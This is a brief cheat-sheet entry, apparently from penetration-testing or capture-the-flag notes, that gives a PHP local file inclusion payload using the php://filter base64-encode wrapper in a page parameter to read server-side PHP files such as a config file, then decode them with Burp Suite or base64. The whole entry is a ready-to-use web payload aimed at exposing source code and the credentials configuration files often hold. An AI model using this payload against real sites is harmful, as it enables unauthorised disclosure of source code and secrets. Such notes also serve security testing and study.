# Web encode to read PHP files

## BurpSuit encode Trick

`GET /?page='php://filter/convert.base64-encode/resource'=<Page to read>`

`GET /?page=php://filter/convert.base64-encode/resource=config`

After this you can use decode from BurpSuit or `base64 -d` from Linux terminal.